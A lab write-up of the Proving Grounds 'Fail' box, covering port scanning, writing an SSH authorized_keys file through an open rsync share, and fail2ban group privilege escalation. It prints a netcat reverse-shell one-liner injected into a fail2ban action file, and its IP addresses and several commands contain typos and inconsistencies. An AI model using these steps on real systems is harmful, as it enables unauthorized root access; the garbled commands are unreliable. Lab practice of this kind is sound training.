---
Alias: Fail
Date: 5/3/2022
Platform: Linux
Difficulty: Intermediate
Tags: #RsyncShare #Fail2BanPrivilegeEscalation #CreateAutorized_KeysSSHfile
Status: Finished
IP: 192.168.143.126
---

# {{Fail}}


# Resolution summary
- Located Rsync share
- Found I can upload files to user fox's home directory (found in the rsync share)
- Created an authorized_keys file in fox's home directory so I could login via SSH session
- Found user is part of the fail2ban group
- Googled steps to escalate privileges with a user being part of the fail2ban group
- Followed the privilege escalation steps and received root shell

## Improved skills
- Locating Rsync shares
- skill 2

## Used tools
- nmap
- rustscan

---

# Information Gathering
Scanned all TCP ports:
```bash
rustscan --addresses 192.168.143.126 --ulimit 5000 -- -A -sC -Pn -sV -T 1500
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/brian/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.143.126:22
Open 192.168.143.126:873
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A -sC -Pn -sV -T 1500" on ip 192.168.143.126
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-16 10:12 PDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:12
Completed NSE at 10:12, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:12
Completed NSE at 10:12, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:12
Completed NSE at 10:12, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:12
Completed Parallel DNS resolution of 1 host. at 10:12, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 10:12
Scanning 192.168.127.126 [2 ports]
Discovered open port 22/tcp on 192.168.143.126
Discovered open port 873/tcp on 192.168.143.126
Completed Connect Scan at 10:13, 30.09s elapsed (2 total ports)
Initiating Service scan at 10:13
Scanning 2 services on 192.168.143.126
Completed Service scan at 10:13, 0.33s elapsed (2 services on 1 host)
NSE: Script scanning 192.168.143.126.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:13
Completed NSE at 10:13, 2.40s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:13
Completed NSE at 10:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:13
Completed NSE at 10:13, 0.00s elapsed
Nmap scan report for 192.168.143.126
Host is up, received user-set (0.078s latency).
Scanned at 2022-10-16 10:13:02 PDT for 17s

PORT    STATE SERVICE REASON  VERSION
22/tcp  open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=
|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+
873/tcp open  rsync   syn-ack (protocol version 31)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:13
Completed NSE at 10:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:13
Completed NSE at 10:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:13
Completed NSE at 10:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.11 seconds

```

Enumerated open TCP ports:
```bash
873
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 873 -Rsync

#### -Per googling port 873 enumeration I found "hacktricks" website showing to type "nmap -sV --script "rsync-list-modules" -p <PORT> <IP>" to enumerate shares:

![](Images/Pasted%20image%2020221015215909.png)

#### -Found share "fox" typing "nmap -sV --script "rsync-list-modules" -p 873 192.168.143.126":

![](Images/Pasted%20image%2020221015220513.png)
#RsyncShare

#### -Per googling port 873 enumeration I found the below web page showing how to list files/directory from rsync server

![](Images/Pasted%20image%2020221015220950.png)

![](Images/Pasted%20image%2020221015221123.png)

#### -Typed "rsync -r 192.168.143.126::fox " and found the below files/directories showing user "fox" home directory and then downloaded all files/directories onto local machine by typing "rsync -av fox@192.168.143.126::fox/ ."

![](Images/Pasted%20image%2020221015221356.png)

![](Images/Pasted%20image%2020221015221635.png)

#### -Found nothing interesting reading the files
	
#### -Tested if I can upload files users "fox" home directory by typing "echo "hello world" > testfile.txt" and typing "rsync testfile.txt -r 192.168.143.126::fox" to see if it uploaded to fox's home directory. And I found I can:

![](Images/Pasted%20image%2020221015221837.png)

#### -The directions how to find out how to do this was found on the previous website showing the following: 

![](Images/Pasted%20image%2020221015222046.png)

#### -Googled "port 873 enumeration" and found the following page from hacktricks showing how to copy all files from your  local machine to the rsync server:

![](Images/Pasted%20image%2020221015222900.png)


#### Then copied all rsync files to kali machine

---

# Exploitation
## Name of the technique

#### -Typed the following commands to create an authorized_keys file in fox's home directory so I can log in via SSH session:
-"mkdir fox" 
-"cd fox"
-"mkdir .ssh"
-"cd .ssh" 
-"touch id_rsa.pub" 
-"ssh-keygen -t rsa" 
-[Enter file in which to save the key (/home/kali/.ssh/id_rsa):] "/home/kali/Downloads/ProvingGroundsBoxes/Fail/fox/.ssh/id_rsa.pub"
-[Enter passphrase (empty for no passphrase):] "password"
-[Enter same passphrase again:] "password"
-"sudo mv id_rsa_pub authorized_keys"
-"cd .."
-"rsync -avp fox/ fox@192.168.120.149::fox/"

#### -Navigated to directory where the "id_rsa" file was created after running "ssh-keygen -t rsa" and typed "chmod 600" to create the correct permissions for the private ssh key

#### -Typed "ssh -I id_rsa fox@192.168.143.126" and typed in "password" for the password and received an ssh session as user fox

![](Images/Pasted%20image%2020221016090756.png)

---

# Privilege Escalation
## Local Enumeration

#### -Ran "LunEnum.sh" script and found user "fox" is an owner of "fail2ban" group:

![](Images/Pasted%20image%2020221016091122.png)

#### -Googled "fail2ban privilege escalation" and found the following webpage showing the steps to escalate privileges:

![](Images/Pasted%20image%2020221016091817.png)

![](Images/Pasted%20image%2020221016091921.png)

![](Images/Pasted%20image%2020221016092000.png)

![](Images/Pasted%20image%2020221016092047.png)

![](Images/Pasted%20image%2020221016092139.png)

![](Images/Pasted%20image%2020221016092235.png)
#Fail2BanPrivilegeEscalation 

---

## Privilege Escalation vector
## Fail2Ban group privelege escalation

#### -Per steps above I navigated to "/etc/fail2ban/action.d" folder and typed "ls –la" and found group "fail2ban" has write priviliges on file "iptables-multiport-log.conf":

![](Images/Pasted%20image%2020221016100412.png)

#### -Typed "vim iptables-multiport-log.conf" and typed "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc [my kali IP] >/tmp/f" to execute a reverse shell on port 85 (syntax found in www.revshells.com) towards the end of the file in vim

![](Images/Pasted%20image%2020221016100629.png)

#### -Ran a "penelope" listener on kali machine listening on port 85

#### -Typed "ssh @fox192.168.236.126" and typed in random passwords just to make "fail2ban" block my IP found in the steps to escalate privileges on the aforementioned website and then received a root shell on my "penelope" listener: 

![](Images/Pasted%20image%2020221016111525.png)
---

